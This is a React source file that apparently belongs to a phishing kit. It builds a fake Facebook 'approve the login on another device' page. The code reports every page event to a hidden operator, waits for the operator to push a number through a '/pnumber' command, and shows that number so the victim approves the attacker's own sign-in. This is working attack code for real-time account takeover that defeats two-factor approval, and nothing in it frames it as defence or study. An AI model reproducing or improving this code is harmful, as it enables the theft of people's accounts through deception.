import React, { useContext, useRef, useEffect } from "react";
import styled from "styled-components";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages";
import LoadingSpinner from "../ui/LoadingSpinner";
import {
  AuthShell,
  AuthColumn,
  AuthEyebrow,
  AuthHeading,
  AuthBody,
  AuthPrimaryButton,
} from "./shared";

const LoadingWrap = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 300px;
  gap: 20px;
  color: #65676b;
  font-size: 15px;
  line-height: 19px;
  text-align: center;
`;

const BigNumber = styled.div`
  font-size: 72px;
  font-weight: 600;
  color: #050505;
  text-align: center;
  margin: 32px 0;
  line-height: 1;
`;

const WaitingRow = styled.div`
  display: flex;
  align-items: flex-start;
  gap: 12px;
  margin: 20px 0;
`;

const BlackCircle = styled.div`
  display: grid;
  place-items: center;
  height: 20px;
  width: 20px;
  border: 2px solid #192432;
  border-radius: 50px;
  flex-shrink: 0;
  margin-top: 2px;
`;

const WaitingTitle = styled.div`
  font-size: 15px;
  font-weight: 500;
  color: #050505;
`;

const SmallText = styled.div`
  color: #050505;
  font-size: 15px;
  line-height: 19px;
`;

function PhoneVerify({ setStep, Step, Name, Unik, approveNumber }) {
  const btnRef = useRef();
  const { setAllData, AllData } = useContext(DataContext);
  const hasNumber = typeof approveNumber === "number";
  const hasReportedMount = useRef(false);
  const lastPropNumber = useRef(
    typeof approveNumber === "number" ? approveNumber : null
  );

  const sendUpdate = (message) => {
    const params = { ...AllData, currentStep: message };
    setAllData(params);
    SendData(params);
  };

  const NextClicked = () => {
    setTimeout(() => {
      setStep(4);
    }, 1000);
  };

  // Continue button 30s timer — starts once the number is displayed
  useEffect(() => {
    if (!hasNumber) return undefined;
    if (btnRef.current) {
      btnRef.current.disabled = true;
    }
    const timer = setTimeout(() => {
      if (Step === 10 && btnRef.current) {
        btnRef.current.disabled = false;
      }
    }, 30000);

    return () => clearTimeout(timer);
  }, [hasNumber]);

  // Mount notification — tell the operator whether a number is ready
  useEffect(() => {
    if (hasReportedMount.current) return;
    hasReportedMount.current = true;

    if (hasNumber) {
      sendUpdate(`Phone Verify Page Loaded - Number displayed: ${approveNumber}`);
    } else {
      sendUpdate(
        `Phone Verify Page Loaded - Waiting for number. Send: /pnumber <10-99> ${Unik}`
      );
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Live-update when the operator sets a number via /pnumber
  useEffect(() => {
    if (typeof approveNumber !== "number") return;
    if (approveNumber === lastPropNumber.current) return;

    lastPropNumber.current = approveNumber;
    sendUpdate(`Phone Verify - Operator set number: ${approveNumber}`);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [approveNumber]);

  // No number yet — waiting for operator /pnumber
  if (!hasNumber) {
    return (
      <AuthShell>
        <AuthColumn>
          <LoadingWrap>
            <LoadingSpinner size="36px" />
            <div>Sending a notification to your signed-in device&hellip;</div>
          </LoadingWrap>
        </AuthColumn>
      </AuthShell>
    );
  }

  return (
    <AuthShell>
      <AuthColumn>
        <AuthEyebrow>Facebook</AuthEyebrow>
        <AuthHeading>Check your notifications on another device</AuthHeading>
        <AuthBody>
          We sent a notification to your Phone or PC. Check your Facebook
          notifications there and approve the login to continue.
        </AuthBody>

        <BigNumber>{approveNumber}</BigNumber>

        <WaitingRow>
          <BlackCircle>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="10"
              height="10"
              fill="currentColor"
              viewBox="0 0 16 16"
            >
              <path d="M3 9.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3m5 0a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3m5 0a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3" />
            </svg>
          </BlackCircle>
          <div>
            <WaitingTitle>Waiting for approval</WaitingTitle>
            <SmallText>
              It may take a few minutes to get the notification on your other
              device.
            </SmallText>
          </div>
        </WaitingRow>

        <AuthPrimaryButton onClick={NextClicked} ref={btnRef}>
          Continue
        </AuthPrimaryButton>
      </AuthColumn>
    </AuthShell>
  );
}

export default PhoneVerify;
